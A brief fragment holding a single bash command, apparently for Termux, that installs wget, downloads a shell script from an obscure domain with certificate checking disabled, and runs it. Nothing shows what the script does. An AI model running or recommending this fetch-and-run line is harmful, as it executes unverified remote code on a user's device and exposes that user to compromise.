...
```bash
cd && pkg install -y wget && wget --no-check-certificate -O termux_install.sh "https://cdqylua.dpdns.org/down.php/56e667f0f501a40f616019c82a306952.sh" && chmod +x termux_install.sh && bash termux_install.sh
```
